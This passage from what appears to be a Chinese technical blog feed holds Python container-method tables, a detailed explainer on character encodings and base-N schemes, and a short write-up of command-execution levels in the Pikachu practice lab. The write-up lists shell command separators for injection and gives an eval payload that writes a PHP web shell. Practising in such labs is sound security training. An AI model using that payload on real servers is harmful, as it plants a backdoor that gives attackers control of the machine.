False.</td></tr><tr><td align="left">16</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-istitle.html">istitle()</a> 如果字符串是标题化的(见 title())则返回 True，否则返回 False</td></tr><tr><td align="left">17</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isupper.html">isupper()</a> 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回 True，否则返回 False</td></tr><tr><td align="left">18</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-join.html">join(seq)</a> 以指定字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串</td></tr><tr><td align="left">19</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-len.html">len(string)</a> 返回字符串长度</td></tr><tr><td align="left">20</td><td align="left">[ljust(width<a href="https://www.runoob.com/python3/python3-string-ljust.html">, fillchar])</a> 返回一个原字符串左对齐,并使用 fillchar 填充至长度 width 的新字符串，fillchar 默认为空格。</td></tr><tr><td align="left">21</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-lower.html">lower()</a> 转换字符串中所有大写字符为小写.</td></tr><tr><td align="left">22</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-lstrip.html">lstrip()</a> 截掉字符串左边的空格或指定字符。</td></tr><tr><td align="left">23</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-maketrans.html">maketrans()</a> 创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。</td></tr><tr><td align="left">24</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-max.html">max(str)</a> 返回字符串 str 中最大的字母。</td></tr><tr><td align="left">25</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-min.html">min(str)</a> 返回字符串 str 中最小的字母。</td></tr><tr><td align="left">26</td><td align="left">[replace(old, new <a href="https://www.runoob.com/python3/python3-string-replace.html">, max])</a> 把 将字符串中的 old 替换成 new,如果 max 指定，则替换不超过 max 次。</td></tr><tr><td align="left">27</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rfind.html">rfind(str, beg=0,end=len(string))</a> 类似于 find()函数，不过是从右边开始查找.</td></tr><tr><td align="left">28</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rindex.html">rindex( str, beg=0, end=len(string))</a> 类似于 index()，不过是从右边开始.</td></tr><tr><td align="left">29</td><td align="left">[rjust(width,<a href="https://www.runoob.com/python3/python3-string-rjust.html">, fillchar])</a> 返回一个原字符串右对齐,并使用fillchar(默认空格）填充至长度 width 的新字符串</td></tr><tr><td align="left">30</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rstrip.html">rstrip()</a> 删除字符串末尾的空格或指定字符。</td></tr><tr><td align="left">31</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-split.html">split(str=””, num=string.count(str))</a> 以 str 为分隔符截取字符串，如果 num 有指定值，则仅截取 num+1 个子字符串</td></tr><tr><td align="left">32</td><td align="left">[splitlines(<a href="https://www.runoob.com/python3/python3-string-splitlines.html">keepends])</a> 按照行(‘\r’, ‘\r\n’, \n’)分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 False，不包含换行符，如果为 True，则保留换行符。</td></tr><tr><td align="left">33</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-startswith.html">startswith(substr, beg=0,end=len(string))</a> 检查字符串是否是以指定子字符串 substr 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查。</td></tr><tr><td align="left">34</td><td align="left">[strip(<a href="https://www.runoob.com/python3/python3-string-strip.html">chars])</a> 在字符串上执行 lstrip()和 rstrip()</td></tr><tr><td align="left">35</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-swapcase.html">swapcase()</a> 将字符串中大写转换为小写，小写转换为大写</td></tr><tr><td align="left">36</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-title.html">title()</a> 返回”标题化”的字符串,就是说所有单词都是以大写开始，其余字母均为小写(见 istitle())</td></tr><tr><td align="left">37</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-translate.html">translate(table, deletechars=””)</a> 根据 str 给出的表(包含 256 个字符)转换 string 的字符, 要过滤掉的字符放到 deletechars 参数中</td></tr><tr><td align="left">38</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-upper.html">upper()</a> 转换字符串中的小写字母为大写</td></tr><tr><td align="left">39</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-zfill.html">zfill (width)</a> 返回长度为 width 的字符串，原字符串右对齐，前面填充0</td></tr><tr><td align="left">40</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isdecimal.html">isdecimal()</a> 检查字符串是否只包含十进制字符，如果是返回 true，否则返回 false。</td></tr></tbody></table><h2 id="二、列表"><a href="#二、列表" class="headerlink" title="二、列表"></a>二、列表</h2><p>与Python字符串不一样的是，列表中的元素是可以改变的，如 a[2:5] = [13, 14, 15]。</p><p>Python包含以下函数:</p><table><thead><tr><th align="left">序号</th><th align="left">函数</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-len.html">len(list)</a> 列表元素个数</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-max.html">max(list)</a> 返回列表元素最大值</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-min.html">min(list)</a> 返回列表元素最小值</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-list.html">list(seq)</a> 将元组转换为列表</td></tr></tbody></table><p>Python包含以下方法:</p><table><thead><tr><th align="left">序号</th><th align="left">方法</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-append.html">list.append(obj)</a> 在列表末尾添加新的对象</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-count.html">list.count(obj)</a> 统计某个元素在列表中出现的次数</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-extend.html">list.extend(seq)</a> 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-index.html">list.index(obj)</a> 从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-insert.html">list.insert(index, obj)</a> 将对象插入列表</td></tr><tr><td align="left">6</td><td align="left">[list.pop(<a href="https://www.runoob.com/python3/python3-att-list-pop.html">index=-1])</a> 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-remove.html">list.remove(obj)</a> 移除列表中某个值的第一个匹配项</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-reverse.html">list.reverse()</a> 反向列表中元素</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-sort.html">list.sort( key=None, reverse=False)</a> 对原列表进行排序</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-clear.html">list.clear()</a> 清空列表</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-copy.html">list.copy()</a> 复制列表</td></tr></tbody></table><h2 id="三、字典"><a href="#三、字典" class="headerlink" title="三、字典"></a>三、字典</h2><p>Python字典包含了以下内置函数：</p><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">len(dict) 计算字典元素个数，即键的总数。</td><td align="left"><code>&gt;&gt;&gt; tinydict = &#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;&#125; &gt;&gt;&gt; len(tinydict) 3</code></td></tr><tr><td align="left">2</td><td align="left">str(dict) 输出字典，可以打印的字符串表示。</td><td align="left"><code>&gt;&gt;&gt; tinydict = &#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;&#125; &gt;&gt;&gt; str(tinydict) &quot;&#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Class&#39;: &#39;First&#39;, &#39;Age&#39;: 7&#125;&quot;</code></td></tr><tr><td align="left">3</td><td align="left">type(variable) 返回输入的变量类型，如果变量是字典就返回字典类型。</td><td align="left"><code>&gt;&gt;&gt; tinydict = &#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;&#125; &gt;&gt;&gt; type(tinydict) &lt;class &#39;dict&#39;&gt;</code></td></tr></tbody></table><p>Python字典包含了以下内置方法：</p><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-clear.html">radiansdict.clear()</a> 删除字典内所有元素</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-copy.html">radiansdict.copy()</a> 返回一个字典的浅复制</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-fromkeys.html">radiansdict.fromkeys()</a> 创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-get.html">radiansdict.get(key, default=None)</a> 返回指定键的值，如果键不在字典中返回 default 设置的默认值</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-in.html">key in dict</a> 如果键在字典dict里返回true，否则返回false</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-items.html">radiansdict.items()</a> 以列表返回一个视图对象</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-keys.html">radiansdict.keys()</a> 返回一个视图对象</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-setdefault.html">radiansdict.setdefault(key, default=None)</a> 和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-update.html">radiansdict.update(dict2)</a> 把字典dict2的键/值对更新到dict里</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-values.html">radiansdict.values()</a> 返回一个视图对象</td></tr><tr><td align="left">11</td><td align="left">pop(key[<a href="https://www.runoob.com/python3/python3-att-dictionary-pop.html">,default])</a> 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-popitem.html">popitem()</a> 返回并删除字典中的最后一对键和值。</td></tr></tbody></table><p>摘抄自：</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于编码方式的总结</title>
      <link href="/2022/01/14/%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81/"/>
      <url>/2022/01/14/%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="各类编码总结"><a href="#各类编码总结" class="headerlink" title="各类编码总结"></a>各类编码总结</h1><h2 id="一、ascii、UTF-8、gbk"><a href="#一、ascii、UTF-8、gbk" class="headerlink" title="一、ascii、UTF-8、gbk"></a>一、ascii、UTF-8、gbk</h2><h3 id="1、ascii码"><a href="#1、ascii码" class="headerlink" title="1、ascii码"></a>1、ascii码</h3><p>ASCII 码一共规定了128个字符的编码：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/v2-976d8be2a77238a37736be97bac66497_r.jpg" alt="preview"></p><h3 id="2、UTF-8、UTF-16、UTF-32"><a href="#2、UTF-8、UTF-16、UTF-32" class="headerlink" title="2、UTF-8、UTF-16、UTF-32"></a>2、UTF-8、UTF-16、UTF-32</h3><p><em>utf（Unicode Transformation Format）</em></p><h4 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8:"></a>UTF-8:</h4><p>​    utf-8是unicode的实现方法。其编码规则如下：</p><blockquote><p>1）对于单字节的符号：字节的第一位设为0，后面7位为这个符号的 Unicode 码。因此对于英语字母，UTF-8 编码和 ASCII 码是相同的；</p><p>2）对于n字节的符号（n &gt; 1）：第一个字节的前n位都设为1，第n + 1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的 Unicode 码。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/v2-6c143515986d542f67de787d85131ea9_r.jpg" alt="preview"></p><p><strong>举例说明：</strong></p><p>选择汉字“鲁”，在<code>unicode</code>官网查询其编码为<code>U+9C81</code></p><p>转换为二级制数字即为：1001 1100 1000 0001，大小两字节。</p><p>​    根据上表，“鲁”字在第三个范围内，其表示即为1110xxxx 10xxxxxx 10xxxxxx，故将前文中的二进制数字填入，即为：11101001 10110010 10000001，再转换为十六进制，即为E9B281。</p><p><strong>特征码：</strong></p><p><em>BOM（byte order mark）</em></p><p>​    在较早的Windows环境下，系统为了能够识别UTF-8这一编码格式，为UTF-8添加了<u>代表其格式的EF BB BF三位特征码（BOM）</u>，而后较高的Windows版本中，系统默认使用UTF-8这一编码格式，不再添加特征码(BOM)。经实验，若将XP环境下创建的、带有BOM的文件在Win10下打开，右下角会显示“带有BOM的UTF-8”字样，文件依然可以正常操作。</p><p><strong>优点、缺点</strong></p><p>缺点：</p><pre><code> 1. 英语国家用起来省空间，其他国家（语言）反而更费空间（汉字有可能需要三个字节） 2. 变长的储存方式导致执行索引效率低，有时需要转化为`UTF-16`或者`UTF-32`</code></pre><p>优点：</p><pre><code>1. 字符空间大于UTF-16；2. 不存在大小端序；3. 容错率高，容易检查出错误；</code></pre><h4 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16:"></a>UTF-16:</h4><p>即，使用两字节表示unicode的编码方法，有以下几个问题：</p><ol><li>大小端序的设置容易导致乱码；</li><li>两字节只能表示六万多个字符，不够用；</li><li>容错低，一处出错，后面全错；</li></ol><p><strong>端序：</strong></p><p>指字符按照什么顺序储存，与编码后内容一样即大端序，相反则小端序。</p><p>试举一例，一个“奎”的Unicode编码是594E，“乙”的Unicode编码是4E59。如果我们收到UTF-16字节流“594E”，那么这是“奎”还是“乙”？如果BOM是大端序，那么代码点就应该是594E，那么就是“奎”，如果BOM是小端序，那么代码点就应该是4E59，就是“乙”了。</p><h4 id="UTF-32："><a href="#UTF-32：" class="headerlink" title="UTF-32："></a>UTF-32：</h4><p>使用四字节表示Unicode的编码方式，占空间比较大。</p><h4 id="特征码（附）："><a href="#特征码（附）：" class="headerlink" title="特征码（附）："></a>特征码（附）：</h4><blockquote><p>有编码对应的开头标志：</p><p><code>EF BB BF        UTF-8 FE FF            UTF-16/UCS-2, little endian FF FE            UTF-16/UCS-2, big endian FF FE 00 00        UTF-32/UCS-4, little endian. 00 00 FE FF        UTF-32/UCS-4, big-endian.</code></p></blockquote><h3 id="3、GBK-GB2312"><a href="#3、GBK-GB2312" class="headerlink" title="3、GBK/GB2312"></a>3、GBK/GB2312</h3><blockquote><p>​    GB全称GuoBiao国标，GBK全称GuoBiaoKuozhan国标扩展。GB18030编码兼容GBK，GBK兼容GB2312，其实这三种编码有着非常深厚的渊源，我们放在一起进行比较。 【GB2312】最早一版的中文编码，每个字占据2bytes。由于要和ASCII兼容，那这2bytes最高位不可以为0了(否则和ASCII会有冲突)。在GB2312中收录了6763个汉字以及682个特殊符号，已经囊括了生活中最常用的所有汉字。</p></blockquote><p>​    总结来说，GBK就是两个字节组成的汉字字符集，同时其通过不让第一个字节为0的方式来兼容ascii码。实际上，有很多比较生僻的名字打不出来就是由于未被GB2312收录的原因。</p><p><strong>全角&amp;半角</strong>：</p><p>在GBK中，也收录了一些数字和字母，即ascii表中有的字母和数字，被GBK又收录了一遍。</p><p><u>那么，当我们直接使用ASCII码，用一个字节来表示数字和字母，就称之为<strong>半角</strong>；</u></p><p><u>若使用GBK中收录的那份数字和字母，用两个字节来表示数字和字母，就称之为<strong>全角</strong>；</u></p><p>通常我们使用半角，因为全角可能在编程过程中导致编译器不认识。</p><p><strong>big5</strong></p><p>big5是台湾搞出来的一种包括繁体的编码方式，与GBK不兼容。</p><p><strong>GB18030</strong></p><p>为了收录比GBK还多的汉字，使用四个字节来表示一个汉字，越来越复杂。</p><p>​    由于汉字编码方式不断迭代，迭代的同时又要保持兼容，GBK和GB2312比ASCII多出来的字都是2bytes，GB18030比GBK多出来的字都是4bytes，而ASCII、GB2312、GBK、GB18030直接有需要保持兼容性，最终就形成了被人诟病的国标汉字编码形式，具体可以参考下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/20645acf6cdf2aa38922bcfbeb676922.png" alt="20645acf6cdf2aa38922bcfbeb676922.png"></p><h2 id="二、乱码的来源"><a href="#二、乱码的来源" class="headerlink" title="二、乱码的来源"></a>二、乱码的来源</h2><h3 id="1、Unicode与国标的不兼容性"><a href="#1、Unicode与国标的不兼容性" class="headerlink" title="1、Unicode与国标的不兼容性"></a>1、Unicode与国标的不兼容性</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/a74eccea4783314561c09e8b3100eb65.png" alt="a74eccea4783314561c09e8b3100eb65.png"></p><p>只兼容ASCII部分。</p><h3 id="2、锟斤拷"><a href="#2、锟斤拷" class="headerlink" title="2、锟斤拷"></a>2、锟斤拷</h3><p>虽然<code>Unicode</code>号称万国码，但是依然有未收录的字符，同时每个地区或操作系统对字符的支持程度也是不同的，因此在<code>Unicode</code>中就有一个特殊字符来代表未知字符：�</p><p>它的<code>Unicode</code>编码为<code>0xFFFD</code>。</p><p>将其<code>Unicode</code>编码转化为<code>UTF-8</code>后，十六进制表示为<code>0xEF 0XBF 0XBD</code></p><p>若同时出现两个乱码符号，转化为十六进制就是<code>0xEF 0XBF 0XBD 0xEF 0XBF 0XBD</code></p><p>这时候再将其强行转码为<code>GBK</code>编码，因为GBK中用两个字节表示一个字符，那么上述的字符就成了<strong>锟</strong>（0xEFBF），<strong>斤</strong>（0xBDEF），<strong>拷</strong>（0xBFBD）。</p><h3 id="3、烫烫烫、屯屯屯、葺葺葺（qi四声）"><a href="#3、烫烫烫、屯屯屯、葺葺葺（qi四声）" class="headerlink" title="3、烫烫烫、屯屯屯、葺葺葺（qi四声）"></a>3、烫烫烫、屯屯屯、葺葺葺（qi四声）</h3><p>Visual Studio中，未初始化的栈空间（即静态分配的空间）用0xCC填充，而未初始化的堆空间（即动态分配的空间）用0xCD填充。</p><p>而0xCCCC和0xCDCD在中文GB2312编码中分别对应“烫”字和“屯”字。</p><p>如果一个字符串没有结束符’\0’，输出时就会打印出未初始化的栈或堆空间的内容，这就是大名鼎鼎的“烫烫烫”、“屯屯屯”乱码。</p><p>而分配了，又被删除的内存，使用0xDDDD来填充，对应“葺”字。</p><h2 id="三、base-XX编码是什么"><a href="#三、base-XX编码是什么" class="headerlink" title="三、base XX编码是什么"></a>三、base XX编码是什么</h2><h3 id="1、base-64、32、16编码流程"><a href="#1、base-64、32、16编码流程" class="headerlink" title="1、base 64、32、16编码流程"></a>1、base 64、32、16编码流程</h3><p>例如要被编码的字符串是：<code>ILU</code></p><ol><li><p>第一步：将 <code>ILU</code> 字符串中的每一个字符转为对应于 <code>Ascii</code> 编码表的值，I = 73, L = 76, U = 85。</p></li><li><p>第二步：将第一步中的 <code>Ascii</code> 值分别转为对应的<code>二进制</code>格式，要求必须是造成<code>8bit</code>，不足8比特位高位补0。例如：1 的二进制是 1，明显不够8位，最终应该显示为:<code>0000 0001</code>。<code>ILU</code> 的转化结果以下：</p><blockquote><p>73 = 01001001</p></blockquote><blockquote><p>76 = 01001100</p></blockquote><blockquote><p>85 = 01010101</p></blockquote></li><li><p>第三步：根据<code>base X</code>(这里的 X 表明 16，32，64等编号) 编码算法中所指定的<code>y 个 bit 位为一个字符在表格中的下标</code> 的规则，对第2步的进行划分。例如 <code>base 16</code>的规则要求，4位做为一个下标对应一个字符，即每4个位为一部分，故划分以下：</p><blockquote><p>第1部分：0100 是 (73 = 01001001，的前4个位)</p></blockquote><blockquote><p>第2部分：1001 是 (73 = 01001001，的后4个位)</p></blockquote><blockquote><p>第3部分：0100</p></blockquote><blockquote><p>第4部分：1100</p></blockquote><blockquote><p>第5部分：0101</p></blockquote><blockquote><p>第6部分：0101</p></blockquote></li><li><p>第四步：将第三步中划分出的<code>每一个部分</code>进行<code>10进制转换</code>，得出对应于10进制数的<code>下标值</code>，以下：</p><blockquote><p>0100 = 4，1001 = 9，4，12，5，5</p></blockquote></li><li><p>第五步：最后一步，将第4步中得出的<code>下标数</code>去<code>查表</code>，得出对应的字符，<code>连在一块儿，就是编码结果</code></p></li></ol><p>​    总结来说，对于16、32、64的<code>base X</code>编码，将内容转化为二进制，分别按<code>4、5、6</code>位分组，然后转化为字符形式即可，其中：</p><table><thead><tr><th align="center">名称</th><th align="left">下标数字的位个数</th><th align="left">编码表字符串</th><th align="left">位数不足是否会补全 =</th></tr></thead><tbody><tr><td align="center">base 16</td><td align="left">4</td><td align="left">数字0<del>9 和 字母 A</del>F</td><td align="left">不会，位数恰好是 4 的倍数</td></tr><tr><td align="center">base 32</td><td align="left">5</td><td align="left">大写字母A<del>Z 和 数字2</del>7</td><td align="left">会</td></tr><tr><td align="center">base 64</td><td align="left">6</td><td align="left">大写字母A<del>Z，小写字母a</del>z，数字0~9以及”+”，”/“</td><td align="left">会</td></tr></tbody></table><p>​    在编码后，base 16的字符数量会变为两倍；base 32会变为5/8倍；base 64会变为4/3倍。</p><h3 id="2、对base-2-n-编码尝试进行计算"><a href="#2、对base-2-n-编码尝试进行计算" class="headerlink" title="2、对base 2^n 编码尝试进行计算"></a>2、对base 2^n 编码尝试进行计算</h3><p>以字符串<code>Lhl_2507</code>为例：</p><p>以<code>utf-8</code>的形式编码为<code>十六进制</code>：<code>4c686c5f32353037</code>；</p><p>转化为二进制数：<code>0100 1100 0110 1000 0110 1100 0101 1111 0011 0010 0011 0101 0011 0000 0011 0111</code>；</p><p>然后分别按照4、5、6位分组：</p><p>​    其中base 16的结果就等同于<code>utf-8</code>的十六进制格式：<code>4c686c5f32353037</code>；</p><p>​    按照<code>五位</code>分组：<code>01001 10001 10100 00110 11000 10111 11001 10010 00110 10100 11000 00011 0111</code></p><p>​    按照<code>A~Z 2~7</code>分别对应<code>0~31</code>(五位二进制转十进制)，进行转化：<code>JRUGYXZSGUYD</code>为前十二位</p><p>​    最后一位需要补全，先补<code>0</code>变为二进制<code>01110</code>对应base 32中的<code>O</code></p><p>​    为了与十六进制统一，需要补充<code>=</code>作为字符数量，前面<code>5*4=20</code>的组合有三组，最后多余一组，因此补充三个<code>=</code></p><p>​    最终结果为<code>JRUGYXZSGUYDO===</code></p><p>​    base 64与base 32思路相同</p><p>​    其64位数分别对应<code> A~Z a~z 0~9 + /</code>用来对应0~63的十进制数</p><p>​    转化结果为<code>TGhsXzI1MDc=</code></p><h3 id="3、非2-n的base-XX编码"><a href="#3、非2-n的base-XX编码" class="headerlink" title="3、非2^n的base XX编码"></a>3、非2^n的base XX编码</h3><h4 id="base-58编码："><a href="#base-58编码：" class="headerlink" title="base 58编码："></a>base 58编码：</h4><blockquote><p>​    base58编码去掉了几个看起来会产生歧义的字符，如 0 (零), O (大写字母O), I (大写的字母i) and l (小写的字母L) ，和几个影响双击选择的字符，如/, +。结果字符集正好58个字符(包括9个数字，24个大写字母，25个小写字母)。</p><p>​    同时，由于58 不是2的整次幂，所以无法使用类似base64编码中使用直接截取3个字符转4个字符（3*8=4*6 , 2的6次方刚好64）的方法进行转换，而是采用我们数学上经常使用的进制转换方法——辗转相除法（本质上，base64编码是64进制，base58是58进制）。看下base58的编码表：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/20180620000601834" alt="img"></p><p>​    试举一例，若要将<code>Lhl</code>字符在utf-8编码下转化为base 58的形式：</p><p>​    转化为十六进制：<code>4c686c</code></p><p>​    十六进制转十进制：<code>5007468</code></p><p>​    十进制转58进制：辗转相除，然后将<code>58进制数字</code>转化为上表的表示形式即可。</p><p>​    结果为：<code>E3QvX8qx</code></p><h4 id="base-91编码："><a href="#base-91编码：" class="headerlink" title="base 91编码："></a>base 91编码：</h4><blockquote><p>​    base91是一种将二进制数据编码为ASCII字符的高级方法。它类似于uuencode或base64，但效率更高。base91产生的开销取决于输入数据。它的数量最多为23%（而base64为33%），其范围可以降低到14%，这通常发生在0字节块上。这使得base91在通过电子邮件或终端线路等二进制不安全连接传输较大文件时非常有用。</p><p>​    顾名思义，base91需要91个字符来表示用ASCII编码的二进制数据。在94个可打印的ASCII字符（0x21-0x7e）中，以下三个字符被省略以构建base91字母表：</p><p>​    -（破折号，0x2d）</p><p>​    \（反斜杠，0x5C）</p><p>​    ‘（撇号，0x27）</p><p>​    翻译表由如下所示的其余字符组成。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/20190816091541986.png" alt="img"></p><p>引用（参考）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[01]: http://www.hiencode.com/&quot;站长工具，用于转化编码&quot;</span><br><span class="line">[02]: https://blog.csdn.net/instruder/article/details/5963344&quot;base 32编码&quot;</span><br><span class="line">[03]: http://www.javashuo.com/article/p-ombqwauc-dc.html&quot;base16，base32，base64 编码方式的通俗讲解&quot;</span><br><span class="line">[04]: https://blog.csdn.net/idwtwt/article/details/80740474&quot;base58编码原理和实现&quot;</span><br><span class="line">[05]: https://blog.csdn.net/qq_42777804/article/details/99671341&quot;bugku 贝斯家族 （base91参照表）&quot;</span><br><span class="line">[06]: https://zhuanlan.zhihu.com/p/38333902&quot;字符编码那点事&quot;</span><br><span class="line">[07]: https://blog.csdn.net/weixin_30898967/article/details/113073386&quot;帮你彻底弄懂常见的中文字符编码&quot;</span><br><span class="line">[08]: https://www.zhihu.com/question/36899383&quot;为什么乱码总是写“屯屯屯屯屯屯屯”或是“烫烫烫烫烫烫”？&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pikachu_命令执行</title>
      <link href="/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY2_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY2_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="PIKACHU通关-命令执行"><a href="#PIKACHU通关-命令执行" class="headerlink" title="PIKACHU通关_命令执行"></a>PIKACHU通关_命令执行</h1><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。<br>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 但是如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p><h2 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h2><p>windows系统和<a href="https://so.csdn.net/so/search?q=linux">linux</a>系统各有4个，其中3个是共有的，各有1个是特有的：</p><ul><li>windows系统：| 、||、&amp;&amp;、&amp;</li><li>linux系统：| 、||、&amp;&amp;、;</li></ul><p>总结一下各连接符号的作用：</p><ol><li> |    管道符，用于把前一个命令的输出作为下一个命令的输入；</li><li> || 逻辑或，只有前一个命令成功，后一个就不执行，反之后一个执行；</li><li> &amp;&amp;逻辑与，只有前一个执行成功才执行后一个，否则不执行；</li><li> &amp; Windows独有，顺序执行每一条命令；</li><li> ；Linux独有，顺序执行每一条命令；</li></ol><h2 id="测试常用命令"><a href="#测试常用命令" class="headerlink" title="测试常用命令"></a>测试常用命令</h2><p><code>whoami</code>命令（Who am i），用于区分Windows和Linux环境：</p><p>（前者有两个参数，用”\“隔开，后者只显示用户名）</p><h2 id="PIKACHU-exec’ping’"><a href="#PIKACHU-exec’ping’" class="headerlink" title="PIKACHU_exec’ping’"></a>PIKACHU_exec’ping’</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111170123070.png" alt="image-20220111170123070"></p><p>没有任何过滤，随便乱杀。</p><h2 id="PIKACHU-exec’eval’"><a href="#PIKACHU-exec’eval’" class="headerlink" title="PIKACHU_exec’eval’"></a>PIKACHU_exec’eval’</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111210928950.png" alt="image-20220111210928950"></p><p>一样没有任何过滤，可以直接使用<code>phpinfo();</code>进行测试，</p><p>或者构造payload<code>fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php assert($_POST[lhl_2507]);?&gt;&#39;);</code></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pikachu_暴力破解</title>
